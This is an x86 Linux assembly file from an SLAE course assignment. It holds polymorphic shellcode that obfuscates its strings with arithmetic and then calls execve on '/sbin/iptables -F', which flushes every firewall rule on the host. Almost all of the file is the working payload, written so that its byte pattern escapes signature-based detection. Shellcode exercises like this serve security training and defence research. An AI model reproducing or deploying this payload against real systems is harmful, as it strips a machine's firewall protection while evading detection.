# Dissection - iptables -F, polymorphic version
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-6a-polymorphic-shellcode-flush-iptables-linux-x86/
 
global _start
section .text
_start:
  xor     eax,eax
  cdq
  push    edx
  push    word 0x462d
  mov     esi,esp
  push    edx
  push    0x73656c62  ; selb
  
  mov     ebx,0x61747168  ; atqh
  add     bl,0x1
  sub     bh,0x1 
  push    ebx
  
  mov     edi,esp
  
  
  mov     ebx,0x2f6e6863  ; /nhc
  sub     bl,0x1          ; /nhb
  add     bh,0x1          ; /nib
  push    ebx  

  mov     ebx,0x732f1e1e  ; s/\x1e\x1e
  add     bx,0x1111       ; s///
  push    ebx
 
  mov     ebx,esp
  push    edx
  push    esi
  push    edi
  mov     ecx,esp

  mov     byte al,0xf
  sub     eax,0x4  
  int     0x80
